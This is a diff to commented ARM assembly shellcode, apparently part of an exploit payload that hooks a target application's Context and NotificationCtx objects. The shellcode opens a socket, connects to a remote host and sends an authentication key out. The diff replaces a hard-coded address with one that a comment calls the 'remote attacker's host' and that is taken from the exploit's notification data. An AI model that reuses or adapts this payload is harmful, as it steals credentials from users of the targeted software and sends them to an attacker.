@@ -5,8 +5,8 @@
 @ c++ code of shell
 @ int socket = api->socket(true);
 @ NetAddr addr;
-@ addr.ip = 0x0101A8C0; // 192.168.1.1
-@ addr.port = 9999;
+@ addr.ip = <some ip address>
+@ addr.port = <some port>
 @ api->connect(socket, &addr);
 @ api->send(socket, authKey);
 @ api->close(socket)
@@ -15,6 +15,8 @@ start:
 	@ sp + 104 is beginning of stack frame of previous function - Context::Update()
 	ldr		r4, [sp, #84]	@ at sp + 84 r5 register is stored, which contain address of Context
 	add		r4, #252		@ NotificationCtx is a member of Context, 252 - offset of it
+	mov		r6, sp
+	sub		r6, #12			@ sp - 12 stores IP address and port of remote attacker's host, it is a part of our notification
 	sub		sp, #300
 	ldr		r0, [r4, #0]	@ load api
 	ldr		r3, [r0, #0]	@ load api vtable
@@ -27,11 +29,7 @@ start:
 	ldr		r3, [r0, #0]	@ load api vtable
 	ldr     r5, [r3, #64]   @ load connect()
 	mov		r1, r7			@ socket
-	ldr		r6, =0x0101A8C0	@ r6 = ip address
-	str		r6, [sp, #0]	@ store ip to NetAddr
-	ldr		r6, =9999		@ r6 = port
-	strh	r6, [sp, #4]	@ store port to NetAddr
-	mov		r2, sp
+	mov		r2, r6			@ IP address and port
 	blx		r5
 
 	ldr     r0, [r4, #0]    @ load api
